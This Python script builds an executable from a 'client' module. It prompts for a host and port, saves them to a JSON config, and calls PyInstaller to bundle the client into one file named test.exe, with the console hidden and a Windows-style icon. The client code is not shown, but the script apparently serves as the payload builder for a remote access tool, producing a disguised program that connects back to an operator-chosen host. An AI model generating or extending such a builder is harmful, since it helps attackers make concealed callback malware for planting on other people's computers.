import PyInstaller.__main__
from setting import setting
from json import dump
from socket import gethostbyname, gaierror

def generateapp(name):
    
    while True:
        host = input(" Host >> ").strip()
        try:
            if host:
                gethostbyname(host)
                break
            raise gaierror
        except gaierror:
            print(" Must be a valid Host\n")
    
    while True:
        try:
            port = int(input(" Port >> ").strip())
            break
        except ValueError:
            print(" Must be a valid Port\n")

    with open("clientSetting.json", "w") as f:
        dump(dict(host=host, port=port, namefile=name),f)

    print()
    print(f"{setting['path_client'].joinpath('main.py').absolute().as_posix()}")
    PyInstaller.__main__.run({
        setting["path_client"].joinpath("run.py").absolute().as_posix(),
        "--onefile",
        f"--name={name}",
        "--icon=windows.ico",
        "--add-data=clientSetting.json;.",
        f"--add-data={setting['path_client'].joinpath('main.py').absolute().as_posix()};.",
        "--noconfirm",
        "--clean",
        "--noconsole",
    })
    

    print(f"\n{name} has been created successfully")
 
if __name__ == "__main__":
    generateapp("test.exe")